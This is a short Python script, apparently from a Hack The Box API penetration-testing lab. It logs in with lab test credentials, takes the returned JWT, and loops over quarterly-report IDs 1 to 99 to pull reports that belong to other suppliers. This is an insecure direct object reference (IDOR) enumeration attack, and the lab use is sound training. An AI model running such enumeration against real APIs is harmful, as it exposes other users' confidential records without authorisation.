#!/usr/bin/python3

import requests
import json
from pprint import pprint

def main():
	email = "htbpentester2@pentestercompany.com"
	password = "HTBPentester2"
	url = "http://94.237.59.63:39454/api/v1/authentication/suppliers/sign-in"
	data = {"Email":email, "Password":password}


	req = requests.post(url=url, json=data)
	if req.status_code == 200:
		# print(req.json())
		jwt = dict(req.json())
		token = jwt["jwt"]

		authorization = {"Authorization": f"Bearer {token}"}

		# print(authorization)

		for x in range(1, 100):
			url_reports = f"http://94.237.59.63:39454/api/v1/suppliers/quarterly-reports/{x}"
			req_reports = requests.get(url=url_reports, headers=authorization)
			pprint(req_reports.json())
			print()
	else:
		print("Something wrong")

if __name__ == "__main__":
	main()


